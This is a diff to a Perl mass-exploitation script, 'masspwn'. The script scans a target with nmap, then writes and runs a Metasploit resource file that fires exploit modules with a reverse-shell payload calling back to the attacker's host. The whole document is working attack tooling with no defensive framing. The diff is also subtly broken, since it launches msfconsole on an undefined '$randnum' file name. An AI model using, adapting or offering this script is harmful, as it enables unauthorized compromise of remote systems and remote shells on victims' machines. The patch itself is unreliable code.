@@ -21,11 +21,10 @@ if($#ARGV < 1) {
 #}
 my $lhost = $ARGV[1];
 my $rhost = $ARGV[0];
+my $pid = $$;
 print("trying to spawn a shell from $rhost...\n");
-unlink("masspwn.nmap");
-unlink("masspwn.msf");
-system("nmap $rhost -oG masspwn.nmap >/dev/null");
-my $nms = `cat masspwn.nmap`;
+system("nmap $rhost -oG masspwn.$pid.nmap >/dev/null");
+my $nms = `cat masspwn.$pid.nmap`;
 my @nmap;
 @nmap = split("\n", $nms);
 @nmap[1] =~ m/Host: (\d+\.\d+\.\d+\.\d+)/;
@@ -62,7 +61,7 @@ foreach my $value (@modules) {
 #my $los = lc($os);
 my $handler = 2000;;
 my $fh;
-open($fh, ">", "masspwn.msf");
+open($fh, ">", "masspwn.$pid.msf");
 foreach(@umods) {
   print($fh "use $_\n");
   print($fh "set RHOST $rhost\n");
@@ -71,10 +70,12 @@ foreach(@umods) {
   print($fh "set ExitOnSession false\n");
   print($fh "set PAYLOAD generic_shell_reverse\n");
   print($fh "exploit -j -z\n");
+  print($fh "exit\n");
   $handler++;
 }
 print($fh "jobs -K\n");
 print($fh "sessions\n");
-
-system("./msfconsole -r masspwn.msf");
+system("./msfconsole -r masspwn.$randnum.msf");
+unlink("masspwn.$pid.msf");
+unlink("masspwn.$pid.nmap");
 exit(0);
